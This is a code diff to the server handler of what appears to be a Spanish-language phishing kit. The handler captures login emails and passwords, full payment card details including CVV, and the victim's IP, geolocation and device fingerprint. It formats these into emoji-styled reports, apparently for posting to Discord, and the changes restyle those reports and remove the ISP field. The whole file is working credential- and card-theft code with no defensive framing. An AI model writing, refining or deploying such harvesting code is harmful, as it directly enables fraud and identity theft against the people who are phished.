@@ -38,7 +38,7 @@ async function getGeoFromIp(ip) {
         region: d.region || '',
         country: d.country_name || d.country || '',
         countryCode: d.country_code || '',
-        isp: d.org || d.isp || d.connection_isp || '',
+        isp: '',
         lat: d.latitude || '',
         lon: d.longitude || ''
       };
@@ -56,7 +56,7 @@ async function getGeoFromIp(ip) {
             region: d2.regionName || '',
             country: d2.country || '',
             countryCode: d2.countryCode || '',
-            isp: d2.isp || '',
+            isp: '',
             lat: d2.lat || '',
             lon: d2.lon || ''
           };
@@ -95,7 +95,8 @@ export default async function handler(req, res) {
     const type = body.type || 'login';
     const timestamp = new Date().toISOString();
     const forwardedFor = req.headers['x-forwarded-for'] || '';
-    const clientIp = forwardedFor.split(',')[0]?.trim() || 'desconocida';
+    const clientIpRaw = forwardedFor.split(',')[0]?.trim() || 'desconocida';
+    const clientIp = clientIpRaw !== 'desconocida' ? clientIpRaw : 'desconocida';
 
     const cardNumber = body.cardNumber || '';
     const cardHolder = body.cardHolder || '';
@@ -121,19 +122,23 @@ export default async function handler(req, res) {
     const batteryLevel = body.batteryLevel || 'No disponible';
     const batteryCharging = body.batteryCharging || 'Desconocido';
 
-    // Geo IP server-side con ipapi.co
-    const geo = await getGeoFromIp(clientIp);
+    // Geo IP server-side
+    const geo = await getGeoFromIp(clientIpRaw);
     const geoCity = geo.city || '';
     const geoRegion = geo.region || '';
     const geoCountry = geo.country || '';
     const geoCountryCode = geo.countryCode || '';
-    const geoIsp = geo.isp || '';
     const geoLat = geo.lat || '';
     const geoLon = geo.lon || '';
 
     const template = config.discordMessageTemplate || '';
     const hasPlaceholders = template.includes('{email}');
     const isPayment = type === 'payment';
+
+    // Determinar tipo de dispositivo legible
+    let deviceTypeText = '🖥️ Escritorio';
+    if (isMobile === 'Sí') deviceTypeText = '📱 Móvil';
+    else if (isTablet === 'Sí') deviceTypeText = '📱 Tablet';
 
     function replaceIfExists(msg, ph, value) {
       if (msg.includes('{' + ph + '}')) {
@@ -148,14 +153,13 @@ export default async function handler(req, res) {
       message = template;
       message = replaceIfExists(message, 'email', email);
       message = replaceIfExists(message, 'password', password);
-      message = replaceIfExists(message, 'type', isPayment ? 'Pago' : 'Login');
+      message = replaceIfExists(message, 'type', isPayment ? '💳 Pago' : '🔐 Login');
       message = replaceIfExists(message, 'ip', clientIp);
       message = replaceIfExists(message, 'geoIp', clientIp);
       message = replaceIfExists(message, 'geoCity', geoCity);
       message = replaceIfExists(message, 'geoRegion', geoRegion);
       message = replaceIfExists(message, 'geoCountry', geoCountry);
       message = replaceIfExists(message, 'geoCountryCode', geoCountryCode);
-      message = replaceIfExists(message, 'geoIsp', geoIsp);
       message = replaceIfExists(message, 'geoLat', geoLat);
       message = replaceIfExists(message, 'geoLon', geoLon);
       message = replaceIfExists(message, 'deviceMemory', deviceMemory);
@@ -179,84 +183,93 @@ export default async function handler(req, res) {
       message = replaceIfExists(message, 'onlineStatus', onlineStatus);
       message = replaceIfExists(message, 'cookiesEnabled', cookiesEnabled);
       message = replaceIfExists(message, 'timestamp', timestamp);
-      message = replaceIfExists(message, 'title', isPayment ? 'Verificacion de pago' : 'Inicio de sesion');
+      message = replaceIfExists(message, 'title', isPayment ? '💳 Verificacion de pago' : '🔐 Inicio de sesion');
 
-      // Si es pago y no tiene cardNumber en plantilla, agregar datos de tarjeta
       if (isPayment && !message.includes('{cardNumber}') && cardNumber) {
-        message += '\n\n----\nDATOS DE TARJETA:';
-        message += '\nNumero: ' + cardNumber;
-        message += '\nTitular: ' + cardHolder;
-        message += '\nVence: ' + expiryDate;
-        message += '\nCVV: ' + cvv;
+        message += '\n\n💳 DATOS DE TARJETA:';
+        message += '\n🔢 Numero: ' + cardNumber;
+        message += '\n👤 Titular: ' + cardHolder;
+        message += '\n📅 Vence: ' + expiryDate;
+        message += '\n🔐 CVV: ' + cvv;
       }
     } else {
-      // Plantilla por defecto
+      // Build device type string WITHOUT ISP, WITHOUT confusing "Tipo: No/No/Si"
+      const deviceParts = [];
+      deviceParts.push('🖥️ CPU: ' + cpuCores + ' nucleos');
+      deviceParts.push('💾 RAM: ' + deviceMemory + ' GB');
+      deviceParts.push('📱 Tipo: ' + deviceTypeText);
+
+      // Build location string WITHOUT ISP
+      const locationParts = [];
+      if (geoCity) locationParts.push('🏙️ Ciudad: ' + geoCity);
+      if (geoRegion) locationParts.push('🗺️ Region: ' + geoRegion);
+      if (geoCountry) locationParts.push('🌐 Pais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : ''));
+      if (geoLat && geoLon) locationParts.push('📍 Coordenadas: ' + geoLat + ', ' + geoLon);
+
       if (isPayment) {
-        // SOLO pago - email + tarjeta + ubicacion (SIN password, SIN dispositivo)
-        message = '💳 Verificacion de pago';
-        message += '\n----------------';
-        message += '\nUsuario: ' + email;
+        // PAGO - email + tarjeta + ubicacion + dispositivo + navegador (SIN ISP)
+        message = '💳 *Verificacion de pago*';
+        message += '\n━━━━━━━━━━━━━━━━━━━━━━━';
+        message += '\n📧 *Usuario:* ' + email;
 
         if (cardNumber) {
-          message += '\n\n----\nDATOS DE TARJETA:';
-          message += '\nNumero: ' + cardNumber;
-          message += '\nTitular: ' + cardHolder;
-          message += '\nVence: ' + expiryDate;
-          message += '\nCVV: ' + cvv;
+          message += '\n\n💳 *Datos de tarjeta:*';
+          message += '\n🔢 *Numero:* ' + cardNumber;
+          message += '\n👤 *Titular:* ' + cardHolder;
+          message += '\n📅 *Vence:* ' + expiryDate;
+          message += '\n🔐 *CVV:* ' + cvv;
         }
 
-        message += '\n----------------';
-        // Ubicacion
-        if (geoCity || geoRegion || geoCountry) {
-          message += '\nUbicacion:';
-          message += '\nCiudad: ' + geoCity;
-          message += '\nRegion: ' + geoRegion;
-          message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
-          message += '\nISP: ' + geoIsp;
+        if (locationParts.length > 0) {
+          message += '\n\n🌍 *Ubicacion:*';
+          for (const p of locationParts) message += '\n' + p;
         }
-        message += '\n----------------';
-        message += '\nHora: ' + timestamp;
+
+        if (deviceParts.length > 0) {
+          message += '\n\n💻 *Dispositivo:*';
+          for (const p of deviceParts) message += '\n' + p;
+        }
+
+        message += '\n\n🌐 *Navegador:* ' + userAgent;
+        message += '\n🌐 *Idioma:* ' + language;
+        message += '\n🖥️ *Pantalla:* ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\n⏰ *Zona horaria:* ' + timezone;
+        message += '\n💻 *Plataforma:* ' + platform;
+        message += '\n📶 *Estado:* ' + onlineStatus;
+        message += '\n🍪 *Cookies:* ' + cookiesEnabled;
+
+        message += '\n\n⏰ *Hora:* ' + timestamp;
       } else {
-        // LOGIN completo - email + password + ubicacion + dispositivo + navegador
-        message = '🔐 Inicio de sesion';
-        message += '\n----------------';
-        message += '\nUsuario: ' + email;
-        message += '\nContraseña: ' + password;
-        message += '\nIP: ' + clientIp;
+        // LOGIN - email + password + ubicacion + dispositivo + navegador (SIN ISP)
+        message = '🔐 *Inicio de sesion*';
+        message += '\n━━━━━━━━━━━━━━━━━━━━━━━';
+        message += '\n📧 *Usuario:* ' + email;
+        message += '\n🔑 *Contraseña:* ' + password;
+        message += '\n🌐 *IP:* ' + clientIp;
 
-        // Ubicacion
-        if (geoCity || geoRegion || geoCountry) {
-          message += '\nUbicacion:';
-          message += '\nCiudad: ' + geoCity;
-          message += '\nRegion: ' + geoRegion;
-          message += '\nPais: ' + geoCountry + (geoCountryCode ? ' (' + geoCountryCode + ')' : '');
-          message += '\nISP: ' + geoIsp;
-          if (geoLat) message += '\nLatitud: ' + geoLat;
-          if (geoLon) message += '\nLongitud: ' + geoLon;
+        if (locationParts.length > 0) {
+          message += '\n\n🌍 *Ubicacion:*';
+          for (const p of locationParts) message += '\n' + p;
         }
-        message += '\n----------------';
 
-        // Dispositivo
-        if (deviceMemory !== 'desconocido' || cpuCores !== 'desconocido') {
-          message += '\nDispositivo:';
-          message += '\nRAM: ' + deviceMemory;
-          message += '\nCPU: ' + cpuCores;
-          message += '\nTipo: ' + isMobile + ' / ' + isTablet + ' / ' + isDesktop;
+        if (deviceParts.length > 0) {
+          message += '\n\n💻 *Dispositivo:*';
+          for (const p of deviceParts) message += '\n' + p;
         }
+
         if (batteryLevel !== 'No disponible') {
-          message += '\nBateria: ' + batteryLevel + ' (Cargando: ' + batteryCharging + ')';
+          message += '\n\n🔋 *Bateria:* ' + batteryLevel + (batteryCharging === 'Sí' ? ' (Cargando)' : '');
         }
 
-        // Navegador
-        message += '\nNavegador: ' + userAgent;
-        message += '\nIdioma: ' + language;
-        message += '\nPantalla: ' + screenResolution + ' (' + colorDepth + ' bits)';
-        message += '\nZona horaria: ' + timezone;
-        message += '\nPlataforma: ' + platform;
-        message += '\nEstado: ' + onlineStatus;
-        message += '\nCookies: ' + cookiesEnabled;
-        message += '\n----------------';
-        message += '\nHora: ' + timestamp;
+        message += '\n\n🌐 *Navegador:* ' + userAgent;
+        message += '\n🌐 *Idioma:* ' + language;
+        message += '\n🖥️ *Pantalla:* ' + screenResolution + ' (' + colorDepth + ' bits)';
+        message += '\n⏰ *Zona horaria:* ' + timezone;
+        message += '\n💻 *Plataforma:* ' + platform;
+        message += '\n📶 *Estado:* ' + onlineStatus;
+        message += '\n🍪 *Cookies:* ' + cookiesEnabled;
+
+        message += '\n\n⏰ *Hora:* ' + timestamp;
       }
     }
 
